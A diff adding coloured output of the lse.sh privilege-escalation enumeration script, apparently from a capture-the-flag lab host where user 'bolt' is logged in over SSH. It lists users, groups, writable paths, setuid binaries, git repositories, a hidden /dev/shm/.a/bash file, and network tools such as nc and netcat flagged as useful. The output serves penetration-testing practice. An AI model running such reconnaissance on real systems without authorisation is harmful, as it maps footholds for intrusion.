@@ -1,0 +1,2320 @@
+[90m---
+[90m---
+
+[94m        User:[0;0m bolt
+[94m     User ID:[0;0m 1001
+[94m    Password:[0;0m [90mnone[0;0m
+[94m        Home:[0;0m /home/bolt
+[94m        Path:[0;0m /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
+[94m       umask:[0;0m 0002
+
+[94m    Hostname:[0;0m bolt
+[94m       Linux:[0;0m 4.15.0-65-generic
+[94mDistribution:[0;0m Ubuntu 18.04.3 LTS
+[94mArchitecture:[0;0m x86_64
+
+[35m==================================================================([32m users [35m)=====[0;0m
+[97m[[94mi[97m] [90musr000[97m Current user groups[90m.............................................[34m yes![0;0m
+[90m---[0;0m
+bolt
+[90m---[0;0m
+[97m[[93m*[97m] [90musr010[97m Is current user in an administrative group?[90m.....................[90m nope[0;0m
+[97m[[93m*[97m] [90musr020[97m Are there other users in an administrative groups?[90m..............[36m yes![0;0m
+[90m---[0;0m
+adm:x:4:syslog
+[90m---[0;0m
+[97m[[93m*[97m] [90musr030[97m Other users with shell[90m..........................................[36m yes![0;0m
+[90m---[0;0m
+root:x:0:0:root:/root:/bin/bash
+bolt:x:1001:1001::/home/bolt:/bin/bash
+git:x:1000:33::/var/www/html:/bin/bash
+[90m---[0;0m
+[97m[[94mi[97m] [90musr040[97m Environment information[90m.........................................[34m yes![0;0m
+[90m---[0;0m
+SSH_CONNECTION=10.10.14.215 39022 10.10.10.159 22
+LANG=en_US.UTF-8
+OLDPWD=/home/bolt
+XDG_SESSION_ID=7
+USER=bolt
+PWD=/tmp
+HOME=/home/bolt
+SSH_CLIENT=10.10.14.215 39022 22
+XDG_DATA_DIRS=/usr/local/share:/usr/share:/var/lib/snapd/desktop
+SSH_TTY=/dev/pts/2
+MAIL=/var/mail/bolt
+SHELL=/bin/bash
+TERM=xterm-256color
+SHLVL=2
+LANGUAGE=en_US:
+LOGNAME=bolt
+XDG_RUNTIME_DIR=/run/user/1001
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin:/sbin:/usr/sbin
+_=/usr/bin/env
+[90m---[0;0m
+[97m[[94mi[97m] [90musr050[97m Groups for other users[90m..........................................[34m yes![0;0m
+[90m---[0;0m
+root:x:0:
+daemon:x:1:
+bin:x:2:
+sys:x:3:
+adm:x:4:syslog
+tty:x:5:
+disk:x:6:
+lp:x:7:
+mail:x:8:
+news:x:9:
+uucp:x:10:
+man:x:12:
+proxy:x:13:
+kmem:x:15:
+dialout:x:20:
+fax:x:21:
+voice:x:22:
+cdrom:x:24:
+floppy:x:25:
+tape:x:26:
+sudo:x:27:
+audio:x:29:
+dip:x:30:
+www-data:x:33:
+backup:x:34:
+operator:x:37:
+list:x:38:
+irc:x:39:
+src:x:40:
+gnats:x:41:
+shadow:x:42:
+utmp:x:43:
+video:x:44:
+sasl:x:45:
+plugdev:x:46:
+staff:x:50:
+games:x:60:
+users:x:100:
+nogroup:x:65534:
+systemd-journal:x:101:
+systemd-network:x:102:
+systemd-resolve:x:103:
+input:x:104:
+crontab:x:105:
+syslog:x:106:
+messagebus:x:107:
+lxd:x:108:
+mlocate:x:109:
+uuidd:x:110:
+ssh:x:111:
+landscape:x:112:
+lpadmin:x:113:
+sambashare:x:114:
+vboxsf:x:999:
+docker:x:998:
+ssl-cert:x:115:
+bolt:x:1001:
+netdev:x:116:
+[90m---[0;0m
+[97m[[94mi[97m] [90musr060[97m Other users[90m.....................................................[34m yes![0;0m
+[90m---[0;0m
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
+syslog:x:102:106::/home/syslog:/usr/sbin/nologin
+messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
+_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
+lxd:x:105:65534::/var/lib/lxd/:/bin/false
+uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
+dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
+pollinate:x:109:1::/var/cache/pollinate:/bin/false
+statd:x:110:65534::/var/lib/nfs:/usr/sbin/nologin
+sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
+bolt:x:1001:1001::/home/bolt:/bin/bash
+vboxadd:x:999:1::/var/run/vboxadd:/bin/false
+git:x:1000:33::/var/www/html:/bin/bash
+[90m---[0;0m
+[35m===================================================================([32m sudo [35m)=====[0;0m
+[97m[[91m![97m] [90msud000[97m Can we sudo without a password?[90m.................................[90m nope[0;0m
+[97m[[91m![97m] [90msud010[97m Can we list sudo commands without a password?[90m...................[90m nope[0;0m
+[97m[[93m*[97m] [90msud040[97m Can we read /etc/sudoers?[90m.......................................[90m nope[0;0m
+[97m[[93m*[97m] [90msud050[97m Do we know if any other users used sudo?[90m........................[90m nope[0;0m
+[35m============================================================([32m file system [35m)=====[0;0m
+[97m[[93m*[97m] [90mfst000[97m Writable files outside user's home[90m..............................[36m yes![0;0m
+[90m---[0;0m
+/tmp
+/tmp/restic
+/tmp/restic/keys
+/tmp/restic/locks
+/tmp/restic/snapshots
+/tmp/restic/data
+/tmp/restic/data/dc
+/tmp/restic/data/bf
+/tmp/restic/data/f9
+/tmp/restic/data/86
+/tmp/restic/data/28
+/tmp/restic/data/85
+/tmp/restic/data/7f
+/tmp/restic/data/6a
+/tmp/restic/data/59
+/tmp/restic/data/4f
+/tmp/restic/data/15
+/tmp/restic/data/52
+/tmp/restic/data/be
+/tmp/restic/data/c4
+/tmp/restic/data/18
+/tmp/restic/data/d7
+/tmp/restic/data/67
+/tmp/restic/data/a9
+/tmp/restic/data/b7
+/tmp/restic/data/09
+/tmp/restic/data/cb
+/tmp/restic/data/17
+/tmp/restic/data/44
+/tmp/restic/data/ea
+/tmp/restic/data/87
+/tmp/restic/data/eb
+/tmp/restic/data/1d
+/tmp/restic/data/ed
+/tmp/restic/data/2d
+/tmp/restic/data/31
+/tmp/restic/data/ce
+/tmp/restic/data/36
+/tmp/restic/data/58
+/tmp/restic/data/b1
+/tmp/restic/data/1e
+/tmp/restic/data/a4
+/tmp/restic/data/46
+/tmp/restic/data/11
+/tmp/restic/data/ac
+/tmp/restic/data/12
+/tmp/restic/data/ca
+/tmp/restic/data/a3
+/tmp/restic/data/51
+/tmp/restic/data/fa
+/tmp/restic/data/ba
+/tmp/restic/data/1a
+/tmp/restic/data/f5
+/tmp/restic/data/c3
+/tmp/restic/data/a0
+/tmp/restic/data/04
+/tmp/restic/data/0e
+/tmp/restic/data/c8
+/tmp/restic/data/55
+/tmp/restic/data/5d
+/tmp/restic/data/40
+/tmp/restic/data/8d
+/tmp/restic/data/9d
+/tmp/restic/data/41
+/tmp/restic/data/7c
+/tmp/restic/data/65
+/tmp/restic/data/8b
+/tmp/restic/data/94
+/tmp/restic/data/d5
+/tmp/restic/data/42
+/tmp/restic/data/a2
+/tmp/restic/data/0a
+/tmp/restic/data/4b
+/tmp/restic/data/f4
+/tmp/restic/data/db
+/tmp/restic/data/0b
+/tmp/restic/data/7a
+/tmp/restic/data/c0
+/tmp/restic/data/33
+/tmp/restic/data/5c
+/tmp/restic/data/aa
+/tmp/restic/data/bd
+/tmp/restic/data/5b
+/tmp/restic/data/95
+/tmp/restic/data/98
+/tmp/restic/data/5f
+/tmp/restic/data/88
+/tmp/restic/data/f6
+/tmp/restic/data/cd
+/tmp/restic/data/69
+/tmp/restic/data/49
+/tmp/restic/data/50
+/tmp/restic/data/de
+/tmp/restic/data/01
+/tmp/restic/data/2b
+/tmp/restic/data/89
+/tmp/restic/data/1c
+/tmp/restic/data/2c
+/tmp/restic/data/8a
+/tmp/restic/data/d1
+/tmp/restic/data/64
+/tmp/restic/data/6f
+/tmp/restic/data/b4
+/tmp/restic/data/9e
+/tmp/restic/data/43
+/tmp/restic/data/d8
+/tmp/restic/data/2f
+/tmp/restic/data/71
+/tmp/restic/data/e8
+/tmp/restic/data/10
+/tmp/restic/data/25
+/tmp/restic/data/ec
+/tmp/restic/data/f3
+/tmp/restic/data/16
+/tmp/restic/data/84
+/tmp/restic/data/ab
+/tmp/restic/data/3e
+/tmp/restic/data/78
+/tmp/restic/data/24
+/tmp/restic/data/75
+/tmp/restic/data/e5
+/tmp/restic/data/4d
+/tmp/restic/data/fb
+/tmp/restic/data/b6
+/tmp/restic/data/8f
+/tmp/restic/data/b5
+/tmp/restic/data/6d
+/tmp/restic/data/c5
+/tmp/restic/data/e2
+/tmp/restic/data/73
+/tmp/restic/data/68
+/tmp/restic/data/0d
+/tmp/restic/data/9f
+/tmp/restic/data/90
+/tmp/restic/data/4a
+/tmp/restic/data/af
+/tmp/restic/data/df
+/tmp/restic/data/14
+/tmp/restic/data/5a
+/tmp/restic/data/ee
+/tmp/restic/data/cc
+/tmp/restic/data/66
+/tmp/restic/data/82
+/tmp/restic/data/29
+/tmp/restic/data/8e
+/tmp/restic/data/3d
+/tmp/restic/data/5e
+/tmp/restic/data/92
+/tmp/restic/data/dd
+/tmp/restic/data/79
+/tmp/restic/data/f8
+/tmp/restic/data/26
+/tmp/restic/data/20
+/tmp/restic/data/74
+/tmp/restic/data/ad
+/tmp/restic/data/a5
+/tmp/restic/data/37
+/tmp/restic/data/53
+/tmp/restic/data/56
+/tmp/restic/data/03
+/tmp/restic/data/f0
+/tmp/restic/data/d0
+/tmp/restic/data/3c
+/tmp/restic/data/0f
+/tmp/restic/data/13
+/tmp/restic/data/fc
+/tmp/restic/data/c9
+/tmp/restic/data/e6
+/tmp/restic/data/9a
+/tmp/restic/data/a7
+/tmp/restic/data/ff
+/tmp/restic/data/f2
+/tmp/restic/data/0c
+/tmp/restic/data/02
+/tmp/restic/data/05
+/tmp/restic/data/70
+/tmp/restic/data/57
+/tmp/restic/data/4c
+/tmp/restic/data/60
+/tmp/restic/data/e4
+/tmp/restic/data/d2
+/tmp/restic/data/bc
+/tmp/restic/data/c7
+/tmp/restic/data/3f
+/tmp/restic/data/63
+/tmp/restic/data/62
+/tmp/restic/data/32
+/tmp/restic/data/c1
+/tmp/restic/data/c2
+/tmp/restic/data/7e
+/tmp/restic/data/21
+/tmp/restic/data/b8
+/tmp/restic/data/e7
+/tmp/restic/data/7b
+/tmp/restic/data/e9
+/tmp/restic/data/ef
+/tmp/restic/data/7d
+/tmp/restic/data/cf
+/tmp/restic/data/3a
+/tmp/restic/data/b9
+/tmp/restic/data/3b
+/tmp/restic/data/97
+/tmp/restic/data/d3
+/tmp/restic/data/39
+/tmp/restic/data/9b
+/tmp/restic/data/a6
+/tmp/restic/data/b0
+/tmp/restic/data/96
+/tmp/restic/data/99
+/tmp/restic/data/77
+/tmp/restic/data/6e
+/tmp/restic/data/83
+/tmp/restic/data/fd
+/tmp/restic/data/b2
+/tmp/restic/data/f1
+/tmp/restic/data/bb
+/tmp/restic/data/fe
+/tmp/restic/data/38
+/tmp/restic/data/b3
+/tmp/restic/data/a8
+/tmp/restic/data/d9
+/tmp/restic/data/e1
+/tmp/restic/data/9c
+/tmp/restic/data/1f
+/tmp/restic/data/a1
+/tmp/restic/data/6c
+/tmp/restic/data/6b
+/tmp/restic/data/54
+/tmp/restic/data/07
+/tmp/restic/data/47
+/tmp/restic/data/72
+/tmp/restic/data/ae
+/tmp/restic/data/c6
+/tmp/restic/data/76
+/tmp/restic/data/45
+/tmp/restic/data/00
+/tmp/restic/data/81
+/tmp/restic/data/4e
+/tmp/restic/data/30
+/tmp/restic/data/2e
+/tmp/restic/data/d4
+/tmp/restic/data/35
+/tmp/restic/data/d6
+/tmp/restic/data/8c
+/tmp/restic/data/91
+/tmp/restic/data/22
+/tmp/restic/data/23
+/tmp/restic/data/93
+/tmp/restic/data/48
+/tmp/restic/data/da
+/tmp/restic/data/19
+/tmp/restic/data/80
+/tmp/restic/data/61
+/tmp/restic/data/06
+/tmp/restic/data/e3
+/tmp/restic/data/f7
+/tmp/restic/data/27
+/tmp/restic/data/1b
+/tmp/restic/data/08
+/tmp/restic/data/2a
+/tmp/restic/data/e0
+/tmp/restic/data/34
+/tmp/restic/index
+/tmp/lse.sh
+/tmp/.X11-unix
+/tmp/.font-unix
+/tmp/linenum_bolt.txt
+/tmp/LinEnum.sh
+/tmp/.XIM-unix
+/tmp/.Test-unix
+/tmp/lse_bolt.txt
+/tmp/.ICE-unix
+/var/tmp
+/var/crash
+/var/lib/php/sessions
+/home/bolt
+[90m---[0;0m
+[97m[[93m*[97m] [90mfst010[97m Binaries with setuid bit[90m........................................[36m yes![0;0m
+[90m---[0;0m
+/sbin/mount.nfs
+/sbin/mount.cifs
+/bin/fusermount
+/bin/su
+/bin/ping
+/bin/umount
+/bin/mount
+/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+/usr/lib/openssh/ssh-keysign
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/snapd/snap-confine
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/bin/pkexec
+/usr/bin/sudo
+/usr/bin/gpasswd
+/usr/bin/chsh
+/usr/bin/passwd
+/usr/bin/at
+/usr/bin/newgidmap
+/usr/bin/newuidmap
+/usr/bin/chfn
+/usr/bin/traceroute6.iputils
+/usr/bin/newgrp
+[90m---[0;0m
+[97m[[91m![97m] [90mfst020[97m Uncommon setuid binaries[90m........................................[92m yes![0;0m
+[90m---[0;0m
+/sbin/mount.cifs
+[90m---[0;0m
+[97m[[91m![97m] [90mfst030[97m Can we write to any setuid binary?[90m..............................[90m nope[0;0m
+[97m[[93m*[97m] [90mfst040[97m Binaries with setgid bit[90m........................................ [90mskip
+[97m[[91m![97m] [90mfst050[97m Uncommon setgid binaries[90m........................................ [90mskip
+[97m[[91m![97m] [90mfst060[97m Can we write to any setgid binary?[90m.............................. [90mskip
+[97m[[93m*[97m] [90mfst070[97m Can we read /root?[90m..............................................[90m nope[0;0m
+[97m[[93m*[97m] [90mfst080[97m Can we read subdirectories under /home?[90m.........................[90m nope[0;0m
+[97m[[93m*[97m] [90mfst090[97m SSH files in home directories[90m...................................[36m yes![0;0m
+[90m---[0;0m
+-rw-r--r-- 1 bolt bolt 222 Nov  3 15:36 /home/bolt/.ssh/known_hosts
+-rw-r--r-- 1 root root 743 Oct 17 09:54 /home/bolt/.ssh/authorized_keys
+[90m---[0;0m
+[97m[[93m*[97m] [90mfst100[97m Useful binaries[90m.................................................[36m yes![0;0m
+[90m---[0;0m
+/usr/bin/curl
+/usr/bin/dig
+/usr/bin/gcc
+/bin/nc.openbsd
+/bin/nc
+/bin/netcat
+/usr/bin/nmap
+/usr/bin/wget
+[90m---[0;0m
+[97m[[93m*[97m] [90mfst110[97m Other interesting files in home directories[90m.....................[90m nope[0;0m
+[97m[[91m![97m] [90mfst120[97m Are there any credentials in fstab/mtab?[90m........................[90m nope[0;0m
+[97m[[93m*[97m] [90mfst130[97m Does 'bolt' have mail?[90m..........................................[90m nope[0;0m
+[97m[[91m![97m] [90mfst140[97m Can we access other users mail?[90m.................................[90m nope[0;0m
+[97m[[93m*[97m] [90mfst150[97m Looking for GIT/SVN repositories[90m................................[36m yes![0;0m
+[90m---[0;0m
+/var/www/html/bolt/.git
+/var/www/html/bolt/vendor/bolt/codingstyle/.git
+[90m---[0;0m
+[97m[[91m![97m] [90mfst160[97m Can we write to critical files?[90m.................................[90m nope[0;0m
+[97m[[94mi[97m] [90mfst500[97m Files owned by user 'bolt'[90m......................................[34m yes![0;0m
+[90m---[0;0m
+-rw------- 1 bolt bolt 442 Nov  3 16:34 /tmp/restic/keys/980a98648f5d60dabda34e40cbea2e5d5fafbc1d89936eaf0147b8bcbbe6ed8e
+-rw------- 1 bolt bolt 155 Nov  3 16:34 /tmp/restic/config
+-rwxr-xr-x 1 bolt bolt 31736 Nov  3 16:33 /tmp/lse.sh
+-rw-rw-r-- 1 bolt bolt 74725 Nov  3 16:33 /tmp/linenum_bolt.txt
+-rwxr-xr-x 1 bolt bolt 45656 Nov  3 16:32 /tmp/LinEnum.sh
+-rw-rw-r-- 1 bolt bolt 13967 Nov  3 16:35 /tmp/lse_bolt.txt
+-rwxr-xr-x 1 bolt bolt 1156536 Nov  3 15:53 /dev/shm/.a/bash
+-rw-r--r-- 1 bolt bolt 0 Sep 26 23:35 /home/bolt/.cache/motd.legal-displayed
+-rw-rw-r-- 1 bolt bolt 5491 Sep 27 09:18 /home/bolt/.cache/composer/repo/https---repo.packagist.org/provider-phar-io$version.json
+-rw-rw-r-- 1 bolt bolt 3101852 Sep 27 09:17 /home/bolt/.cache/composer/repo/https---repo.packagist.org/p-provider-2019-07.json
+-rw-rw-r-- 1 bolt bolt 6282 Sep 27 09:17 /home/bolt/.cache/composer/repo/https---repo.packagist.org/provider-doctrine$reflection.json
+-rw-rw-r-- 1 bolt bolt 2051413 Sep 27 09:17 /home/bolt/.cache/composer/repo/https---repo.packagist.org/p-provider-2015.json
+-rw-rw-r-- 1 bolt bolt 12425 Sep 27 09:17 /home/bolt/.cache/composer/repo/https---repo.packagist.org/provider-doctrine$inflector.json
+-rw-rw-r-- 1 bolt bolt 83535 Sep 27 09:17 /home/bolt/.cache/composer/repo/https---repo.packagist.org/provider-psr$http-message.json
+-rw-rw-r-- 1 bolt bolt 38895 Sep 27 09:17 /home/bolt/.cache/composer/repo/https---repo.packagist.org/provider-doctrine$cache.json
+-rw-rw-r-- 1 bolt bolt 732970 Sep 27 09:17 /home/bolt/.cache/composer/repo/https---repo.packagist.org/provider-symfony$security-acl.json
+-rw-rw-r-- 1 bolt bolt 5050 Sep 27 09:18 /home/bolt/.cache/composer/repo/https---repo.packagist.org/provider-phpunit$php-text-template.json
+-rw-rw-r-- 1 bolt bolt 1911564 Sep 27 09:17 /home/bolt/.cache/composer/repo/https---repo.packagist.org/provider-symfony$options-resolver.json
+-rw-rw-r-- 1 bolt bolt 6080 Sep 27 09:18 /home/bolt/.cache/composer/repo/https---repo.packagist.org/provider-lstrojny$phpunit-function-mocker.json
+-rw-rw-r-- 1 bolt bolt 215339 Sep 27 09:17 /home/bolt/.cache/composer/repo/https---repo.packagist.org/provider-league$flysystem.json
+-rw-rw-r-- 1 bolt bolt 1572573 Sep 27 09:17 /home/bolt/.cache/composer/repo/https---repo.packagist.org/provider-symfony$var-dumper.json
+-rw-rw-r-- 1 bolt bolt 113233 Sep 27 09:17 /home/bolt/.cache/composer/repo/https---repo.packagist.org/provider-embed$embed.json
+-rw-rw-r-- 1 bolt bolt 59295 Sep 27 09:18 /home/bolt/.cache/composer/repo/https---repo.packagist.org/provider-behat$gherkin.json
+-rw-rw-r-- 1 bolt bolt 1979666 Sep 27 09:17 /home/bolt/.cache/composer/repo/https---repo.packagist.org/provider-symfony$css-selector.json
+-rw-rw-r-- 1 bolt bolt 30151 Sep 27 09:18 /home/bolt/.cache/composer/repo/https---repo.packagist.org/provider-sebastian$environment.json
+-rw-rw-r-- 1 bolt bolt 19351 Sep 27 09:17 /home/bolt/.cache/composer/repo/https---repo.packagist.org/provider-bolt$themes.json
+-rw-rw-r-- 1 bolt bolt 27077 Sep 27 09:17 /home/bolt/.cache/composer/repo/https---repo.packagist.org/provider-psr$log.json
+-rw-rw-r-- 1 bolt bolt 267577 Sep 27 09:17 /home/bolt/.cache/composer/repo/https---repo.packagist.org/provider-codeception$codeception.json
+-rw-rw-r-- 1 bolt bolt 80567 Sep 27 09:17 /home/bolt/.cache/composer/repo/https---repo.packagist.org/provider-monolog$monolog.json
+-rw-rw-r-- 1 bolt bolt 10932 Sep 27 09:17 /home/bolt/.cache/composer/repo/https---repo.packagist.org/provider-contao$imagine-svg.json
+-rw-rw-r-- 1 bolt bolt 9903 Sep 27 09:17 /home/bolt/.cache/composer/repo/https---repo.packagist.org/provider-webmozart$assert.json
+-rw-rw-r-- 1 bolt bolt 10092 Sep 27 09:18 /home/bolt/.cache/composer/repo/https---repo.packagist.org/provider-sebastian$object-enumerator.json
+-rw-rw-r-- 1 bolt bolt 2776853 Sep 27 09:17 /home/bolt/.cache/composer/repo/https---repo.packagist.org/provider-symfony$polyfill-php56.json
+-rw-rw-r-- 1 bolt bolt 3880 Sep 27 09:17 /home/bolt/.cache/composer/repo/https---repo.packagist.org/provider-bolt$requirements.json
+-rw-rw-r-- 1 bolt bolt 7680 Sep 27 09:18 /home/bolt/.cache/composer/repo/https---repo.packagist.org/provider-sebastian$global-state.json
+-rw-rw-r-- 1 bolt bolt 1305283 Sep 27 09:17 /home/bolt/.cache/composer/repo/https---repo.packagist.org/p-provider-latest.json
+-rw-rw-r-- 1 bolt bolt 5523 Sep 27 09:17 /home/bolt/.cache/composer/repo/https---repo.packagist.org/provider-bolt$passwordlib.json
+-rw-rw-r-- 1 bolt bolt 2239158 Sep 27 09:17 /home/bolt/.cache/composer/repo/https---repo.packagist.org/provider-symfony$form.json
+-rw-rw-r-- 1 bolt bolt 114345 Sep 27 09:17 /home/bolt/.cache/composer/repo/https---repo.packagist.org/provider-composer$composer.json
+-rw-rw-r-- 1 bolt bolt 35579 Sep 27 09:17 /home/bolt/.cache/composer/repo/https---repo.packagist.org/provider-doctrine$annotations.json
+-rw-rw-r-- 1 bolt bolt 2321683 Sep 27 09:17 /home/bolt/.cache/composer/repo/https---repo.packagist.org/provider-symfony$security.json
+-rw-rw-r-- 1 bolt bolt 12452 Sep 27 09:18 /home/bolt/.cache/composer/repo/https---repo.packagist.org/provider-doctrine$instantiator.json
+-rw-rw-r-- 1 bolt bolt 2296952 Sep 27 09:17 /home/bolt/.cache/composer/repo/https---repo.packagist.org/provider-symfony$validator.json
+-rw-rw-r-- 1 bolt bolt 322186 Sep 27 09:17 /home/bolt/.cache/composer/repo/https---repo.packagist.org/provider-symfony$phpunit-bridge.json
+-rw-rw-r-- 1 bolt bolt 2302661 Sep 27 09:17 /home/bolt/.cache/composer/repo/https---repo.packagist.org/provider-symfony$http-kernel.json
+-rw-rw-r-- 1 bolt bolt 32569 Sep 27 09:18 /home/bolt/.cache/composer/repo/https---repo.packagist.org/provider-phpspec$prophecy.json
+-rw-rw-r-- 1 bolt bolt 1996618 Sep 27 09:17 /home/bolt/.cache/composer/repo/https---repo.packagist.org/provider-symfony$dom-crawler.json
+-rw-rw-r-- 1 bolt bolt 1890084 Sep 27 09:17 /home/bolt/.cache/composer/repo/https---repo.packagist.org/p-provider-2019-01.json
+-rw-rw-r-- 1 bolt bolt 2379073 Sep 27 09:17 /home/bolt/.cache/composer/repo/https---repo.packagist.org/provider-symfony$twig-bridge.json
+-rw-rw-r-- 1 bolt bolt 25711 Sep 27 09:18 /home/bolt/.cache/composer/repo/https---repo.packagist.org/provider-sebastian$comparator.json
+-rw-rw-r-- 1 bolt bolt 3205 Sep 27 09:17 /home/bolt/.cache/composer/repo/https---repo.packagist.org/provider-bolt$pathogen.json
+-rw-rw-r-- 1 bolt bolt 4043571 Sep 27 09:17 /home/bolt/.cache/composer/repo/https---repo.packagist.org/p-provider-2017.json
+-rw-rw-r-- 1 bolt bolt 7787 Sep 27 09:17 /home/bolt/.cache/composer/repo/https---repo.packagist.org/provider-composer$xdebug-handler.json
+-rw-rw-r-- 1 bolt bolt 1270299 Sep 27 09:17 /home/bolt/.cache/composer/repo/https---repo.packagist.org/p-provider-2014.json
+-rw-rw-r-- 1 bolt bolt 2506722 Sep 27 09:17 /home/bolt/.cache/composer/repo/https---repo.packagist.org/provider-symfony$polyfill-php71.json
+-rw-rw-r-- 1 bolt bolt 27013 Sep 27 09:17 /home/bolt/.cache/composer/repo/https---repo.packagist.org/provider-bolt$filesystem.json
+-rw-rw-r-- 1 bolt bolt 1814762 Sep 27 09:17 /home/bolt/.cache/composer/repo/https---repo.packagist.org/provider-symfony$debug.json
+-rw-rw-r-- 1 bolt bolt 614594 Sep 27 09:17 /home/bolt/.cache/composer/repo/https---repo.packagist.org/provider-phpunit$phpunit.json
+-rw-rw-r-- 1 bolt bolt 16626 Sep 27 09:17 /home/bolt/.cache/composer/repo/https---repo.packagist.org/provider-composer$spdx-licenses.json
+-rw-rw-r-- 1 bolt bolt 10954 Sep 27 09:18 /home/bolt/.cache/composer/repo/https---repo.packagist.org/provider-phpdocumentor$reflection-common.json
+-rw-rw-r-- 1 bolt bolt 63270 Sep 27 09:17 /home/bolt/.cache/composer/repo/https---repo.packagist.org/provider-symfony$polyfill-intl-icu.json
+-rw-rw-r-- 1 bolt bolt 2081959 Sep 27 09:17 /home/bolt/.cache/composer/repo/https---repo.packagist.org/provider-symfony$web-profiler-bundle.json
+-rw-rw-r-- 1 bolt bolt 23142 Sep 27 09:18 /home/bolt/.cache/composer/repo/https---repo.packagist.org/provider-sebastian$phpcpd.json
+-rw-rw-r-- 1 bolt bolt 7110 Sep 27 09:17 /home/bolt/.cache/composer/repo/https---repo.packagist.org/provider-jdorn$sql-formatter.json
+-rw-rw-r-- 1 bolt bolt 2145483 Sep 27 09:17 /home/bolt/.cache/composer/repo/https---repo.packagist.org/provider-symfony$monolog-bridge.json
+-rw-rw-r-- 1 bolt bolt 13899 Sep 27 09:18 /home/bolt/.cache/composer/repo/https---repo.packagist.org/provider-sebastian$diff.json
+-rw-rw-r-- 1 bolt bolt 13257 Sep 27 09:18 /home/bolt/.cache/composer/repo/https---repo.packagist.org/provider-phpunit$php-file-iterator.json
+-rw-rw-r-- 1 bolt bolt 2167989 Sep 27 09:17 /home/bolt/.cache/composer/repo/https---repo.packagist.org/provider-symfony$routing.json
+-rw-rw-r-- 1 bolt bolt 8355 Sep 27 09:17 /home/bolt/.cache/composer/repo/https---repo.packagist.org/provider-bolt$session.json
+-rw-rw-r-- 1 bolt bolt 1322572 Sep 27 09:17 /home/bolt/.cache/composer/repo/https---repo.packagist.org/provider-paragonie$random-compat.json
+-rw-rw-r-- 1 bolt bolt 1933942 Sep 27 09:17 /home/bolt/.cache/composer/repo/https---repo.packagist.org/provider-symfony$intl.json
+-rw-rw-r-- 1 bolt bolt 19126 Sep 27 09:18 /home/bolt/.cache/composer/repo/https---repo.packagist.org/provider-sebastian$exporter.json
+-rw-rw-r-- 1 bolt bolt 3998269 Sep 27 09:17 /home/bolt/.cache/composer/repo/https---repo.packagist.org/p-provider-2018.json
+-rw-rw-r-- 1 bolt bolt 1820473 Sep 27 09:17 /home/bolt/.cache/composer/repo/https---repo.packagist.org/provider-symfony$stopwatch.json
+-rw-rw-r-- 1 bolt bolt 18675 Sep 27 09:17 /home/bolt/.cache/composer/repo/https---repo.packagist.org/provider-siriusphp$validation.json
+-rw-rw-r-- 1 bolt bolt 30667 Sep 27 09:18 /home/bolt/.cache/composer/repo/https---repo.packagist.org/provider-psr$simple-cache.json
+-rw-rw-r-- 1 bolt bolt 2409 Sep 27 09:17 /home/bolt/.cache/composer/repo/https---repo.packagist.org/provider-seld$phar-utils.json
+-rw-rw-r-- 1 bolt bolt 3087784 Sep 27 09:17 /home/bolt/.cache/composer/repo/https---repo.packagist.org/p-provider-2016.json
+-rw-rw-r-- 1 bolt bolt 12221 Sep 27 09:17 /home/bolt/.cache/composer/repo/https---repo.packagist.org/provider-tdammers$htmlmaid.json
+-rw-rw-r-- 1 bolt bolt 11428 Sep 27 09:17 /home/bolt/.cache/composer/repo/https---repo.packagist.org/provider-composer$semver.json
+-rw-rw-r-- 1 bolt bolt 55756 Sep 27 09:17 /home/bolt/.cache/composer/repo/https---repo.packagist.org/provider-carbondate$carbon.json
+-rw-rw-r-- 1 bolt bolt 2461542 Sep 27 09:17 /home/bolt/.cache/composer/repo/https---repo.packagist.org/provider-symfony$security-core.json
+-rw-rw-r-- 1 bolt bolt 29592 Sep 27 09:17 /home/bolt/.cache/composer/repo/https---repo.packagist.org/provider-guzzlehttp$psr7.json
+-rw-rw-r-- 1 bolt bolt 30670 Sep 27 09:18 /home/bolt/.cache/composer/repo/https---repo.packagist.org/provider-phpunit$php-token-stream.json
+-rw-rw-r-- 1 bolt bolt 5272 Sep 27 09:18 /home/bolt/.cache/composer/repo/https---repo.packagist.org/provider-phar-io$manifest.json
+-rw-rw-r-- 1 bolt bolt 8299 Sep 27 09:18 /home/bolt/.cache/composer/repo/https---repo.packagist.org/provider-sebastian$version.json
+-rw-rw-r-- 1 bolt bolt 25181 Sep 27 09:17 /home/bolt/.cache/composer/repo/https---repo.packagist.org/provider-facebook$webdriver.json
